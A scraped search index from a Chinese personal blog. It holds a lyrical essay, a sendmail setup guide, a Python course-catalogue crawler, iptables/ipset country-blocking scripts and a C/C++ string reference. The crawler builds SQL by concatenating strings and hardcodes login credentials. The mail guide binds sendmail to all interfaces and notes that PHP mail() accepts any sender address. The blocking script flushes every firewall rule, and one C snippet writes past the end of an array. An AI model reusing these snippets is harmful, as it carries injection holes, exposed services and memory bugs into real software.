人生若只如初见该多好，让那种自然，那种回忆，那种真诚，一直弥漫在生命之中，该多好啊。为什么人与人之间会有误会，会有费解，会有猜测和非议呢？为什么还有冷落，争吵和疏远呢？为什么？ 初遇是一场美丽的梦，美丽的梦和美丽的诗一样，都是可遇而不可求的，常常在最没料想到的时刻出现，在最没料想到的时刻消失。 在这场不该有我的梦里，我依然在期盼，一切可以重新开始，一切都可以慢慢解释，想象之中还能再回到初遇时的欣喜和感动。在梦里你依然如故，在我眼前，你的微笑，一如那年那月那时那分那秒，依旧让我那么心动。 每个人都会有初遇的情结，像一杯清水那般清纯透明，透明中包含着一种叫做永不会再来的幸福，稍纵即逝，有的人拼命的想抓住，拼命的追寻，可他还是如烟随风，轻轻流逝再也不见了，初遇的情怀，是一场淡淡的清风，太过执着了，便迷失了自己，惹一世的忧伤。让他自由吧，只留一丝在梦里，安慰曾经渴望的心。 有一种情怀你不会明白，你永远明白不了，因为它是属于我自己的，也许你我仅仅错过了一秒，就已注定已错过了今生。 人生若只如初见，忧伤的美丽只能注定定格在回忆中。也许哪天，转身而去，留下一个美丽远去的背影，完美的弧线，会诉说着对昨天依恋。 人生若只如初见，不舍的眼眸只为停留在离去的那刻，也许哪天你出现在我的梦里。倾城的微笑，会解释着那些年的思念。 人生如此，浮生若萍，相逢情缘深？相恋情缘浅！辗转一季花开花落，不变的容颜下，是否还有一颗不曾改变的心？情生情死若一场烟花雨，最终还是不见了踪影。初遇时情真至深，再见时，唯有一滴伤心断肠泪，一抹忧伤忘怀笑。擦肩而过，回头看，不曾见。来时伴…… ","date":"2018-12-03","objectID":"https://lgf.im/posts/life/if-time-could-stop-at-the-moment-when-we-first-met/:0:0","tags":["好文"],"title":"人生若只如初见","uri":"https://lgf.im/posts/life/if-time-could-stop-at-the-moment-when-we-first-met/"},{"categories":["coding"],"content":"通过Sendmail服务发送邮件 系统centos7 需要开启25端口 ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/send-mail-via-endmail-service/:0:0","tags":["mail","php"],"title":"通过Sendmail服务发送邮件","uri":"https://lgf.im/posts/coding/send-mail-via-endmail-service/"},{"categories":["coding"],"content":"安装sendmail yum -y install sendmail sendmail-cf ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/send-mail-via-endmail-service/:0:1","tags":["mail","php"],"title":"通过Sendmail服务发送邮件","uri":"https://lgf.im/posts/coding/send-mail-via-endmail-service/"},{"categories":["coding"],"content":"安装MTA功能测试用软件 yum -y install mailx php ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/send-mail-via-endmail-service/:0:2","tags":["mail","php"],"title":"通过Sendmail服务发送邮件","uri":"https://lgf.im/posts/coding/send-mail-via-endmail-service/"},{"categories":["coding"],"content":"切换系统的邮件发送接口 alternatives --config mta 画面显示： There are 2 programs which provide 'mta'. Selection Command ----------------------------------------------- + 1 /usr/sbin/sendmail.postfix * 2 /usr/sbin/sendmail.sendmail Enter to keep the current selection[+], or type selection number: 2 输入2后回车即把MTA功能切换到sendmail上，+号会显示在sendmail的行头。 ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/send-mail-via-endmail-service/:0:3","tags":["mail","php"],"title":"通过Sendmail服务发送邮件","uri":"https://lgf.im/posts/coding/send-mail-via-endmail-service/"},{"categories":["coding"],"content":"配置sendmail vi /etc/mail/sendmail.mc DAEMON_OPTIONS(\\`Port=smtp,Addr=127.0.0.1, Name=MTA\\')dnl 把Addr的值从127.0.0.1修改为0.0.0.0，不限制使用MTA的IP。 m4 /etc/mail/sendmail.mc \u003e /etc/mail/sendmail.cf 生成正式的配置文件。 ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/send-mail-via-endmail-service/:0:4","tags":["mail","php"],"title":"通过Sendmail服务发送邮件","uri":"https://lgf.im/posts/coding/send-mail-via-endmail-service/"},{"categories":["coding"],"content":"重启并测试功能 reboot -f 重启完成后确认MTA程序已经切换到sendmail ps aux | grep sendmail root 1003 0.0 0.2 88688 2280 ? Ss 10:40 0:00 sendmail: accepting connections smmsp 1018 0.0 0.1 84120 1912 ? Ss 10:40 0:00 sendmail: Queue runner@01:00:00 for /var/spool/clientmqueue root 1141 0.0 0.0 112660 968 pts/1 R+ 10:51 0:00 grep --color=auto sendmail sendmail的相关进程已经启动 ps aux | grep postfix root 1161 0.0 0.0 112660 968 pts/1 R+ 11:04 0:00 grep --color=auto postfix postfix的相关进程都没有开启 ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/send-mail-via-endmail-service/:0:5","tags":["mail","php"],"title":"通过Sendmail服务发送邮件","uri":"https://lgf.im/posts/coding/send-mail-via-endmail-service/"},{"categories":["coding"],"content":"用PHP函数发送邮件 php -a 在PHP的交互界面下输入以下函数 mail('test@sohu.com', \"Test email content\", \"sendmail title\", null, \"-f testname@sendmail.com\"); 使用PHP接口做测试的好处是可以随意指定发送方的邮件地址，即mail函数的最后一个参数。 即使系统的hostname未设置也可以正常发送出邮件。 ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/send-mail-via-endmail-service/:0:6","tags":["mail","php"],"title":"通过Sendmail服务发送邮件","uri":"https://lgf.im/posts/coding/send-mail-via-endmail-service/"},{"categories":["coding"],"content":"使用linux的mail命令发送邮件 mail命令就没有使用自定义的邮件发送地址，而是使用HOSTNAME。 安装系统时由于没有对hostname做特别设置，HOSTNAME的值是默认的 localhost.localdomain 这样的邮件域名会被大多数邮箱如163，QQ拒收。 查看邮件发送log会发现以下错误 cat /var/log/maillog dsn=4.1.8, stat=Deferred: 450 4.1.8 \u003croot@localhost.localdomain\u003e: Sender address rejected: Domain not found 修改HOSTNAME vi /etc/hosts 在最后加上一行 192.168.2.108 intest.com 这里的IP地址是我跑sendmail虚拟机的IP，需根据实际情况设置 其实这个文件hosts只是用来设置本地路由表，但填上本机IP时，系统在启动初始化中查到本机IP在hosts中，就会用hosts文件中对应的域名来设置HOSTNAME。 重新启动 reboot -f 重启后发现本地的DNS配置文件etc/resolv.conf 已经被自动更新。 内容变成 nameserver 192.168.2.1 执行mail命令发送邮件 echo \"test mail content\"|mail -s \"Mail title\" test@sohu.com ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/send-mail-via-endmail-service/:0:7","tags":["mail","php"],"title":"通过Sendmail服务发送邮件","uri":"https://lgf.im/posts/coding/send-mail-via-endmail-service/"},{"categories":["coding"],"content":"补充 ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/send-mail-via-endmail-service/:1:0","tags":["mail","php"],"title":"通过Sendmail服务发送邮件","uri":"https://lgf.im/posts/coding/send-mail-via-endmail-service/"},{"categories":["coding"],"content":"切换系统的邮件发送接口 alternatives --config mta Postfix是Centos7系统默认自带。 也可以用命令 yum list installed | grep postfix 确认 选择postfix所在行的编号后回车 ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/send-mail-via-endmail-service/:1:1","tags":["mail","php"],"title":"通过Sendmail服务发送邮件","uri":"https://lgf.im/posts/coding/send-mail-via-endmail-service/"},{"categories":["coding"],"content":"重启并测试功能 reboot -f 重启后查看进程看到postfix相关的进程已经启动 ps aux | grep postfix root 1093 0.0 0.2 89544 2172 ? Ss 08:55 0:00 /usr/libexec/postfix/master -w postfix 1094 0.0 0.4 89648 4016 ? S 08:55 0:00 pickup -l -t unix -u postfix 1095 0.0 0.4 89716 4044 ? S 08:55 0:00 qmgr -l -t unix -u postfix 1237 0.0 0.4 89796 4072 ? S 09:08 0:00 cleanup -z -t unix -u postfix 1238 0.0 0.4 89652 4024 ? S 09:08 0:00 trivial-rewrite -n rewrite -t unix -u postfix 1239 0.0 0.4 89856 4272 ? S 09:08 0:00 smtp -t unix -u root 1274 0.0 0.0 112660 972 pts/1 R+ 09:09 0:00 grep --color=auto postfix 系统的hostname已经在sendmail配置的第六步中完成了配置，这里就直接使用PHP与mail命令 两种方法做测试。 php -a mail('test@sohu.com', \"Test email No1\", \"postfix mail\", null, \"-f test@ccfst.com\"); * php的mail函数可以随意指定发送地址 echo \"test mail\"|mail -s \"postfix mail title\" test@sohu.com ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/send-mail-via-endmail-service/:1:2","tags":["mail","php"],"title":"通过Sendmail服务发送邮件","uri":"https://lgf.im/posts/coding/send-mail-via-endmail-service/"},{"categories":["coding"],"content":"环境python3.6 # -*- coding:utf-8 -*- import sys import requests import hashlib import json import pymysql # Initialize Session s = requests.Session() ua = {\"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0\"} s.headers.update(ua) def login(): username = \"201700301234\" password = \"123456\".encode() # Get cookies s.get(\"http://bkjwxk.sdu.edu.cn\") # Set properties to login hs = hashlib.md5() hs.update(password) password = hs.hexdigest() data = \"j_username=\" + username + \"\u0026j_password=\" + password headers = { \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Referer\": \"http://bkjwxk.sdu.edu.cn/f/login\", \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"X-Requested-With\": \"XMLHttpRequest\" } r = s.post(\"http://bkjwxk.sdu.edu.cn/b/ajaxLogin\", data=data, headers=headers) # Check if is successful if r.text != \"\\\"success\\\"\": print(\"登陆出错\") print(\"Detailed message: \") print(r.text) sys.exit() print(\"登陆成功\") # get one page data def onepage(i): data = \"type=kc\u0026currentPage=\" + i + \"\u0026kch=\u0026jsh=\u0026skxq=\u0026skjc=\u0026kkxsh=\" headers = { \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Referer\": \"http://bkjwxk.sdu.edu.cn/f/common/main\", \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"X-Requested-With\": \"XMLHttpRequest\" } r = s.post(\"http://bkjwxk.sdu.edu.cn/b/xk/xs/kcsearch\", data=data, headers=headers) return json.loads(r.text) # 向数据库插入一条数据 def insertone(index, kch, kxh, kcm, xf, kclb, kclbmc, kkxsh, kkxsm, kkxsjc, jsh, ksm, sjdd): # 打开数据库连接 db = pymysql.connect(\"localhost\", \"kc\", \"kc\", \"kc\", charset='utf8') # 使用cursor()方法获取操作游标 cursor = db.cursor() # SQL 插入语句 sql = \"INSERT INTO kcinfo(`id`,`kch`,`kxh`,`kcm`,`xf`,`kclb`,`kclbmc`,`kkxsh`,`kkxsm`,`kkxsjc`,`jsh`,`ksm`,`sjdd`) VALUES ('\" + index + \"','\" + kch + \"','\" + kxh + \"','\" + kcm + \"','\" + xf + \"','\" + kclb + \"','\" + kclbmc + \"','\" + kkxsh + \"','\" + kkxsm + \"','\" + kkxsjc + \"','\" + jsh + \"','\" + ksm + \"','\" + sjdd + \"')\" try: # 执行sql语句 cursor.execute(sql) # 提交到数据库执行 db.commit() except: print(sql) # 如果发生错误则回滚 db.rollback() def godata(i): js = onepage(i) for result in js[\"object\"][\"resultList\"]: kch = result[\"KCH\"] if kch is not None else \"\" # 课程号 kxh = str(result[\"KXH\"]) if kxh is not None else \"\" # 课序号 kcm = result[\"KCM\"] # 课程名 if not kcm: kcm = \"\" xf = str(result[\"XF\"]) # 学分 if not xf: xf = \"0\" kclb = result[\"KCLB\"] # 课程类别 if not kclb: kclb = \"\" kclbmc = result[\"KCLBMC\"] # 课程类别名称 if not kclbmc: kclbmc = \"\" kkxsh = result[\"KKXSH\"] # 开课学院号 if not kkxsh: kkxsh = \"\" kkxsm = result[\"KKXSM\"] # 开科学院名 if not kkxsm: kkxsm = \"\" kkxsjc = result[\"KKXSJC\"] # 开课学院简称 if not kkxsjc: kkxsjc = \"\" jsh = str(result[\"JSH\"]) # 教师号 if not jsh: jsh = \"0\" ksm = result[\"JSM\"] # 教师名 if not ksm: ksm = \"\" sjdd = result[\"SJDD\"] # 上课时间/地点 if not sjdd: sjdd = \"\" index = str(result[\"NUM\"]) # 序号 无用 if not index: index = \"0\" # 插 insertone(index, kch, kxh, kcm, xf, kclb, kclbmc, kkxsh, kkxsm, kkxsjc, jsh, ksm, sjdd) login() for i in range(1, 173): godata(str(i)) print(\"第\" + str(i) + \"页完成\") ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/crawl-all-the-courses-of-the-educational-administration-system-and-store-them-in-the-database/:0:0","tags":["python"],"title":"爬取教务系统所有课程并存入数据库","uri":"https://lgf.im/posts/coding/crawl-all-the-courses-of-the-educational-administration-system-and-store-them-in-the-database/"},{"categories":["coding"],"content":"搭建了一个MTProxy，分享出去，最后发现网速跑满，连接ip数高达600多，并且还在不断增加。 查看ip来源后发现九成以上是伊朗人，后来知道原来tg在他们国家被封了，所以才导致如此。 所以想办法屏蔽这些ip，准确的说是一整个国家的ip,或者说是一堆ip ","date":"2018-12-03","objectID":"https://lgf.im/posts/linux/block-all-ips-in-a-country/:0:0","tags":["ipset","iptables","linux","shell"],"title":"屏蔽一个国家所有IP","uri":"https://lgf.im/posts/linux/block-all-ips-in-a-country/"},{"categories":["coding"],"content":"使用iptables添加规则 方法如下： 1.下载一个国家的ip段，网址：http://www.ipdeny.com/ipblocks/ wget http://www.ipdeny.com/ipblocks/data/countries/ir.zone 2.使用脚本批量添加iptables规则 #!/bin/bash # Block traffic from a specific country COUNTRY=\"ir\" IPTABLES=/sbin/iptables EGREP=/bin/egrep if [ \"$(id -u)\" != \"0\" ]; then echo \"you must be root\" 1\u003e\u00262 exit 1 fi resetrules() { $IPTABLES -F $IPTABLES -t nat -F $IPTABLES -t mangle -F $IPTABLES -X } resetrules for c in $COUNTRY do country_file=$c.zone IPS=$($EGREP -v \"^#|^$\" $country_file) for ip in $IPS do echo \"blocking $ip\" $IPTABLES -A INPUT -s $ip -j DROP done done iptables-save exit 0 ","date":"2018-12-03","objectID":"https://lgf.im/posts/linux/block-all-ips-in-a-country/:1:0","tags":["ipset","iptables","linux","shell"],"title":"屏蔽一个国家所有IP","uri":"https://lgf.im/posts/linux/block-all-ips-in-a-country/"},{"categories":["coding"],"content":"使用ipset添加ip集合 发现用iptables直接添加ip实在低效，可以用其扩展ipset直接添加一个集合。 什么是IP集? 这时候就是IP集登场了。IP集是一个内核特性，它允许多个（独立）IP地址、MAC地址或者甚至是端口号被编码和有效地存储在位图/哈希内核数据结构中。一旦IP集创建之后，你可以创建一条iptables规则来匹配这个集合。 你马上就会看见IP集合的好处了，它可以让你用一条iptable规则匹配多个ip地址！你可以用多个IP地址和端口号的方式来构造IP集，并且可以动态地更新规则而没有性能影响。 在Linux中安装IPset工具 为了创建和管理IP集，你需要使用称为ipset的用户空间工具。 要在Debian、Ubuntu或者Linux Mint上安装： $ sudo apt-get install ipset Fedora或者CentOS/RHEL 7上安装： $ sudo yum install ipset 使用IPset命令禁止IP 让我通过简单的示例告诉你该如何使用ipset命令。 首先，让我们创建一条新的IP集，名为banthis（名字任意）： $ sudo ipset create banthis hash:net 第二个参数(hash:net)是必须的，代表的是集合的类型。IP集有多个类型。hash:net类型的IP集使用哈希来存储多个CIDR块。如果你想要在一个集合中存储单独的IP地址，你可以使用hash:ip类型。 一旦创建了一个IP集之后，你可以用下面的命令来检查： $ sudo ipset list 这显示了一个可用的IP集合列表，并有包含了集合成员的详细信息。默认上，每个IP集合可以包含65536个元素（这里是CIDR块）。你可以通过追加\"maxelem N\"选项来增加限制。 $ sudo ipset create banthis hash:net maxelem 1000000 现在让我们来增加IP块到这个集合中： $ sudo ipset add banthis 1.1.1.1/32 $ sudo ipset add banthis 1.1.2.0/24 $ sudo ipset add banthis 1.1.3.0/24 $ sudo ipset add banthis 1.1.4.10/24 这一步可以使用shell脚本自动添加 你会看到集合成员已经改变了。 $ sudo ipset list 现在是时候去创建一个使用IP集的iptables规则了。这里的关键是使用\"-m set –match-set “选项。 现在是时候去创建一个使用IP集的iptables规则了。这里的关键是使用”-m set –match-set “选项。 现在让我们创建一条让之前那些IP块不能通过80端口访问web服务的iptable规则。可以通过下面的命令： $ sudo iptables -I INPUT -m set --match-set banthis src -p tcp --destination-port 80 -j DROP 如果你愿意，你可以保存特定的IP集到一个文件中，以后可以从文件中还原： $ sudo ipset save banthis -f banthis.txt $ sudo ipset destroy banthis $ sudo ipset restore -f banthis.txt ","date":"2018-12-03","objectID":"https://lgf.im/posts/linux/block-all-ips-in-a-country/:2:0","tags":["ipset","iptables","linux","shell"],"title":"屏蔽一个国家所有IP","uri":"https://lgf.im/posts/linux/block-all-ips-in-a-country/"},{"categories":["coding"],"content":"自用脚本 #!/bin/bash EGREP=/bin/egrep con_file=$1.zone ipset=$1ip wget http://www.ipdeny.com/ipblocks/data/countries/$con_file ipset creat $ipset hash:net IPS=$($EGREP -v \"^#|^$\" $con_file) for ip in $IPS do ipset add $ipset $ip done rm $con_file iptables -I INPUT -m set --match-set $ipset src -p tcp --destination-port 6666 -j DROP iptables-save exit 0 ","date":"2018-12-03","objectID":"https://lgf.im/posts/linux/block-all-ips-in-a-country/:3:0","tags":["ipset","iptables","linux","shell"],"title":"屏蔽一个国家所有IP","uri":"https://lgf.im/posts/linux/block-all-ips-in-a-country/"},{"categories":["coding"],"content":"参考文章： 在Linux下实现批量屏蔽IP地址的方法 ","date":"2018-12-03","objectID":"https://lgf.im/posts/linux/block-all-ips-in-a-country/:4:0","tags":["ipset","iptables","linux","shell"],"title":"屏蔽一个国家所有IP","uri":"https://lgf.im/posts/linux/block-all-ips-in-a-country/"},{"categories":["coding"],"content":" rember this strncpy(a,b,5); a[5]='\\0'; char a[10]; memset(a,'#',sizeof(a)); a[10]='\\0'; 刚开始学C/C++时，一直对字符串处理函数一知半解，这里列举C/C++字符串处理函数，希望对初学者有一定的帮助。 C： char st[100]; 字符串长度 strlen(st); 字符串比较 strcmp(st1,st2); //把st1,st2的前n个进行比较。 strncmp(st1,st2,n); 附加 strcat(st1,st2); strncat(st1,st2,n); //n表示连接上st2的前n个给st1，在最后不要加'\\0'。 替换 strcpy(st1,st2); strncpy(st1,st2,n); //n表示复制st2的前n个给st1，在最后要加'\\0'。 查找 where = strchr(st,ch) //ch为要找的字符。 where = strspn(st1,st2); //查找字符串。 where = strstr(st1,st2); C++： \u003cstring\u003e string str; 字符串长度 len = str.length(); len = str.size(); 字符串比较 可以直接比较 也可以: str1.compare(str2); str1.compare(pos1,len1,str2,pos2,len2); //值为负，0 ，正。 //nops 长度到完。 附加 str1 += str2; 或 str1.append(str2); str1.append(str2.pos2,len2); 字符串提取 str2 = str1.substr(); str2 = str1.substr(pos1); str2 = str1.substr(pos1,len1); string a=s.substr(0,4); //获得字符串s中 从第0位开始的长度为4的字符串 字符串搜索 where = str1.find(str2); where = str1.find(str2,pos1); //pos1是从str1的第几位开始。 where = str1.rfind(str2); //从后往前搜。 插入字符串 不是赋值语句。 str1.insert(pos1,str2); str1.insert(pos1,str2,pos2,len2); str1.insert(pos1,numchar,char); //numchar是插入次数，char是要插入的字符。 替换字符串 str1.replace(pos1,str2); str1.replace(pos1,str2,pos2,len2); 删除字符串 str.erase(pos,len) str.clear(); 交换字符串 swap(str1,str2); C –\u003e C++ char *cstr = \"Hello\"; string str1; cstr = cstr; string str2(cstr); 对于ACMer来说，C的字符串处理要比C++的方便、简单，尽量用C的字符串处理函数。 C++中string类常用算法 ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/c-cpp-string-op/:0:0","tags":["c","c++","coding"],"title":"c/c++字符串处理大集合","uri":"https://lgf.im/posts/coding/c-cpp-string-op/"},{"categories":["coding"],"content":"string类的构造函数： string(const char *s); //用c字符串s初始化 string(int n,char c); //用n个字符c初始化 此外，string类还支持默认构造函数和复制构造函数，如: string s1；string s2=\"hello\"； 都是正确的写法。 当构造的string太长而无法表达时会抛出length_error异常 ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/c-cpp-string-op/:1:0","tags":["c","c++","coding"],"title":"c/c++字符串处理大集合","uri":"https://lgf.im/posts/coding/c-cpp-string-op/"},{"categories":["coding"],"content":"string类的字符操作： const char \u0026operator[](int n)const; const char \u0026at(int n)const; char \u0026operator[](int n); char \u0026at(int n); //operator[]和at()均返回当前字符串中第n个字符的位置，但at函数提供范围检查，当越界时会抛出out_of_range异常，下标运算符[]不提供检查访问。 const char *data()const;//返回一个非null终止的c字符数组 const char *c_str()const;//返回一个以null终止的c字符串 int copy(char *s, int n, int pos = 0) const;//把当前串中以pos开始的n个字符拷贝到以s为起始位置的字符数组中，返回实际拷贝的数目 ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/c-cpp-string-op/:2:0","tags":["c","c++","coding"],"title":"c/c++字符串处理大集合","uri":"https://lgf.im/posts/coding/c-cpp-string-op/"},{"categories":["coding"],"content":"string的特性描述: int capacity()const; //返回当前容量（即string中不必增加内存即可存放的元素个数） int max_size()const; //返回string对象中可存放的最大字符串的长度 int size()const;//返回当前字符串的大小 int length()const; //返回当前字符串的长度 bool empty()const;//当前字符串是否为空 void resize(int len,char c);//把字符串当前大小置为len，并用字符c填充不足的 ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/c-cpp-string-op/:3:0","tags":["c","c++","coding"],"title":"c/c++字符串处理大集合","uri":"https://lgf.im/posts/coding/c-cpp-string-op/"},{"categories":["coding"],"content":"部分string类的输入输出操作: string类重载运算符operator\u003e\u003e//用于输入，同样重载运算符operator\u003c\u003c用于输出操作。函数getline(istream \u0026in,string \u0026s);//用于从输入流in中读取字符串到s中，以换行符'\\n'分开。 ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/c-cpp-string-op/:4:0","tags":["c","c++","coding"],"title":"c/c++字符串处理大集合","uri":"https://lgf.im/posts/coding/c-cpp-string-op/"},{"categories":["coding"],"content":"string的赋值： string \u0026operator=(const string \u0026s);//把字符串s赋给当前字符串 string \u0026assign(const char *s);//用c类型字符串s赋值 string \u0026assign(const char *s,int n);//用c字符串s开始的n个字符赋值 string \u0026assign(const string \u0026s);//把字符串s赋给当前字符串 string \u0026assign(int n,char c);//用n个字符c赋值给当前字符串 string \u0026assign(const string \u0026s,int start,int n);//把字符串s中从start开始的n个字符赋给当前字符串 string \u0026assign(const_iterator first,const_itertor last);//把first和last迭代器之间的部分赋给字符串 ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/c-cpp-string-op/:5:0","tags":["c","c++","coding"],"title":"c/c++字符串处理大集合","uri":"https://lgf.im/posts/coding/c-cpp-string-op/"},{"categories":["coding"],"content":"string的连接： //把字符串s连接到当前字符串的结尾 string \u0026operator+=(const string \u0026s); //把c类型字符串s连接到当前字符串结尾 string \u0026append(const char *s); //把c类型字符串s的前n个字符连接到当前字符串结尾 string \u0026append(const char *s,int n); //同operator+=() string \u0026append(const string \u0026s); //把字符串s中从pos开始的n个字符连接到当前字符串的结尾 string \u0026append(const string \u0026s,int pos,int n); //在当前字符串结尾添加n个字符c string \u0026append(int n,char c); //把迭代器first和last之间的部分连接到当前字符串的结尾 string \u0026append(const_iterator first,const_iterator last); ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/c-cpp-string-op/:6:0","tags":["c","c++","coding"],"title":"c/c++字符串处理大集合","uri":"https://lgf.im/posts/coding/c-cpp-string-op/"},{"categories":["coding"],"content":"string的比较： //比较两个字符串是否相等运算符\"\u003e\",\"\u003c\",\"\u003e=\",\"\u003c=\",\"!=\"均被重载用于字符串的比较； bool perator==(const string \u0026s1,const string \u0026s2)const; //比较当前字符串和s的大小 int compare(const string \u0026s) const; //比较当前字符串从pos开始的n个字符组成的字符串与s的大小 int compare(int pos, int n,const string \u0026s)const; //比较当前字符串从pos开始的n个字符组成的字符串与s中pos2开始的n2个字符组成的字符串的大小 int compare(int pos, int n,const string \u0026s,int pos2,int n2)const; int compare(const char *s) const; int compare(int pos, int n,const char *s) const; int compare(int pos, int n,const char *s, int pos2) const; //compare函数在\u003e时返回1，\u003c时返回-1，==时返回0 ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/c-cpp-string-op/:7:0","tags":["c","c++","coding"],"title":"c/c++字符串处理大集合","uri":"https://lgf.im/posts/coding/c-cpp-string-op/"},{"categories":["coding"],"content":"string的子串： //返回pos开始的n个字符组成的字符串string的交换： string substr(int pos = 0,int n = npos) const; //交换当前字符串与s2的值 void swap(string \u0026s2); ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/c-cpp-string-op/:8:0","tags":["c","c++","coding"],"title":"c/c++字符串处理大集合","uri":"https://lgf.im/posts/coding/c-cpp-string-op/"},{"categories":["coding"],"content":"string类的查找函数： //从pos开始查找字符c在当前字符串的位置 int find(char c, int pos = 0) const; //从pos开始查找字符串s在当前串中的位置 int find(const char *s, int pos = 0) const; //从pos开始查找字符串s中前n个字符在当前串中的位置 int find(const char *s, int pos, int n) const; //从pos开始查找字符串s在当前串中的位置 //查找成功时返回所在位置，失败返回string::npos的值 int find(const string \u0026s, int pos = 0) const; //从pos开始从后向前查找字符c在当前串中的位置 int rfind(char c, int pos = npos) const; int rfind(const char *s, int pos = npos) const; int rfind(const char *s, int pos, int n = npos) const; int rfind(const string \u0026s,int pos = npos) const; //从pos开始从后向前查找字符串s中前n个字符组成的字符串在当前串中的位置，成功返回所在位置，失败时返回string::npos的值 //从pos开始查找字符c第一次出现的位置 int find_first_of(char c, int pos = 0) const; int find_first_of(const char *s, int pos = 0) const; int find_first_of(const char *s, int pos, int n) const; int find_first_of(const string \u0026s,int pos = 0) const; //从pos开始查找当前串中第一个在s的前n个字符组成的数组里的字符的位置。查找失败返回string::npos int find_first_not_of(char c, int pos = 0) const; int find_first_not_of(const char *s, int pos = 0) const; int find_first_not_of(const char *s, int pos,int n) const; int find_first_not_of(const string \u0026s,int pos = 0) const; //从当前串中查找第一个不在串s中的字符出现的位置，失败返回string::npos int find_last_of(char c, int pos = npos) const; int find_last_of(const char *s, int pos = npos) const; int find_last_of(const char *s, int pos, int n = npos) const; int find_last_of(const string \u0026s,int pos = npos) const; int find_last_not_of(char c, int pos = npos) const; int find_last_not_of(const char *s, int pos = npos) const; int find_last_not_of(const char *s, int pos,int n) const; int find_last_not_of(const string \u0026s,int pos = npos) const; //find_last_of和find_last_not_of与find_first_of和find_first_not_of相似，只不过是从后向前查找 ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/c-cpp-string-op/:9:0","tags":["c","c++","coding"],"title":"c/c++字符串处理大集合","uri":"https://lgf.im/posts/coding/c-cpp-string-op/"},{"categories":["coding"],"content":"string类的替换函数： //删除从p0开始的n0个字符，然后在p0处插入串s string \u0026replace(int p0, int n0,const char *s); //删除p0开始的n0个字符，然后在p0处插入字符串s的前n个字符 string \u0026replace(int p0, int n0,const char *s, int n); //删除从p0开始的n0个字符，然后在p0处插入串s string \u0026replace(int p0, int n0,const string \u0026s); //删除p0开始的n0个字符，然后在p0处插入串s中从pos开始的n个字符 string \u0026replace(int p0, int n0,const string \u0026s, int pos, int n); //删除p0开始的n0个字符，然后在p0处插入n个字符c string \u0026replace(int p0, int n0,int n, char c); //把[first0，last0）之间的部分替换为字符串s string \u0026replace(iterator first0, iterator last0,const char *s); //把[first0，last0）之间的部分替换为s的前n个字符 string \u0026replace(iterator first0, iterator last0,const char *s, int n); //把[first0，last0）之间的部分替换为串s string \u0026replace(iterator first0, iterator last0,const string \u0026s); //把[first0，last0）之间的部分替换为n个字符c string \u0026replace(iterator first0, iterator last0,int n, char c); //把[first0，last0）之间的部分替换成[first，last）之间的字符串string类的插入函： string \u0026replace(iterator first0, iterator last0,const_iterator first,const_iteratorlast); string \u0026insert(int p0, const char *s); string \u0026insert(int p0, const char *s, int n); string \u0026insert(int p0,const string \u0026s); string \u0026insert(int p0,const string \u0026s, int pos, int n); //前4个函数在p0位置插入字符串s中pos开始的前n个字符 //此函数在p0处插入n个字符c string \u0026insert(int p0, int n, char c); //在it处插入字符c，返回插入后迭代器的位置 iterator insert(iterator it, char c); //在it处插入[first，last）之间的字符 void insert(iterator it, const_iterator first, const_iterator last); //在it处插入n个字符c void insert(iterator it, int n, char c); ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/c-cpp-string-op/:10:0","tags":["c","c++","coding"],"title":"c/c++字符串处理大集合","uri":"https://lgf.im/posts/coding/c-cpp-string-op/"},{"categories":["coding"],"content":"string类的删除函数 //删除[first，last）之间的所有字符，返回删除后迭代器的位置 iterator erase(iterator first, iterator last); //删除it指向的字符，返回删除后迭代器的位置 iterator erase(iterator it); //删除pos开始的n个字符，返回修改后的字符串 string \u0026erase(int pos = 0, int n = npos); ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/c-cpp-string-op/:11:0","tags":["c","c++","coding"],"title":"c/c++字符串处理大集合","uri":"https://lgf.im/posts/coding/c-cpp-string-op/"},{"categories":["coding"],"content":"string类的迭代器处理： string类提供了向前和向后遍历的迭代器iterator，迭代器提供了访问各个字符的语法，类似于指针操作，迭代器不检查范围。 用string::iterator或string::const_iterator声明迭代器变量，const_iterator不允许改变迭代的内容。 ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/c-cpp-string-op/:12:0","tags":["c","c++","coding"],"title":"c/c++字符串处理大集合","uri":"https://lgf.im/posts/coding/c-cpp-string-op/"},{"categories":["coding"],"content":"常用迭代器函数有： const_iterator begin()const; iterator begin(); //返回string的起始位置 const_iterator end()const; iterator end();//返回string的最后一个字符后面的位置 const_iterator rbegin()const; iterator rbegin(); //返回string的最后一个字符的位置 const_iterator rend()const; iterator rend();//返回string第一个字符位置的前面rbegin 和rend用于从后向前的迭代访问，通过设置迭代器 string::reverse_iterator,string::const_reverse_iterator实现 